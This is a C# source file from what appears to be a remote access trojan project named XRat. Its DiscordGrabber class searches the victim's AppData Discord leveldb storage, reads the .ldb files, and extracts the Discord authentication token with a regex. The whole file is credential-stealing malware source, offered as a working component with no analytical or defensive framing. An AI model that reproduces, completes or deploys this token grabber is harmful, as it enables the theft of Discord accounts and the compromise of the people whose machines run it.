using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace XRat
{
    public static class DiscordGrabber
    {
        /// <summary>
        /// Get token from dicord folder @AppData\discord\Local Storage\leveld (old method)
        /// </summary>

        /// <summary>
        /// to exctact the token text from ldb file using regex
        /// </summary>
        public static string GetToken()
        {
            string tokenExit = "";
            var files = SearchForFile(); // to get ldb files
            if (files.Count == 0)
            {
                //Console.WriteLine("Didn't find any ldb files");
                return "Didn't find any .ldb files";
            }
            foreach (string token in files)
            {
                foreach (Match match in Regex.Matches(token, "[^\"]*"))
                {
                    if (match.Length == 59)
                    {
                        tokenExit = match.ToString();

                        //using (StreamWriter sw = new StreamWriter("Token.txt", true))
                        //{
                        //    tokens.Append(match.ToString());
                        //}
                    }
                }
            }

            return tokenExit;
        }

        /// <summary>
        /// check is discord path exists then add "*.ldb" files to list<string>
        /// </summary>
        /// <returns>string</returns>
        private static List<string> SearchForFile()
        {
            List<string> ldbFiles = new List<string>();
            string discordPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";

            if (!Directory.Exists(discordPath))
            {
                //Console.WriteLine("Discord path not found");
                return ldbFiles;
            }

            foreach (string file in Directory.GetFiles(discordPath, "*.ldb", SearchOption.TopDirectoryOnly))
            {
                string rawText = File.ReadAllText(file);
                if (rawText.Contains("oken"))
                {
                    //Console.WriteLine($"{Path.GetFileName(file)} added");
                    ldbFiles.Add(rawText);
                }
            }
            return ldbFiles;
        }
    }
}